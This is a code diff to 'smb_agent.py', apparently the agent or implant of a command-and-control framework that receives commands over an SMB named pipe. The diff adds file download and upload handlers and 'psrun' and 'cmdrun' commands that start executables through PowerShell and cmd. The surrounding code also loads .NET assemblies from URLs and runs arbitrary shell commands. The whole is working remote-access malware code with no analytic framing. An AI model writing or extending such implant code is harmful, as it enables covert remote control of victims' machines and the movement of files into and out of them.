@@ -1,5 +1,3 @@
-# smb_agent.py
-
 import time
 import logging
 import subprocess
@@ -22,6 +20,7 @@ from utils.winapi.ps import list_processes, grep_processes, terminate_process
 from utils.winapi.run import run_process
 from utils.winapi.netexec import load_dotnet_assembly
 from utils.config import PIPENAME
+from utils.file_operations import handle_download_command, handle_upload_command
 
 logging.basicConfig(level=logging.INFO)
 
@@ -68,6 +67,22 @@ def handle_command(command):
             file_url, arguments = parts[1], parts[2]
             output, error = load_dotnet_assembly(file_url, arguments)
             result = output if not error else f"{output}\n{error}"
+        elif command.startswith("download"):
+            result, error = handle_download_command(command)
+            result = result if not error else f"{result}\n{error}"
+        elif command.startswith("upload"):
+            result, error = handle_upload_command(command)
+            result = result if not error else f"{result}\n{error}"
+        elif command.startswith("psrun"):
+            parts = command.split(maxsplit=1)
+            executable_path = parts[1]
+            result = subprocess.Popen(["powershell.exe", "-Command", f"Start-Process -FilePath '{executable_path}'"])
+            result = f"Started process: {executable_path}"
+        elif command.startswith("cmdrun"):
+            parts = command.split(maxsplit=1)
+            executable_path = parts[1]
+            result = subprocess.Popen(["cmd.exe", "/c", f"start {executable_path}"])
+            result = f"Started process: {executable_path}"
         else:
             result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
 
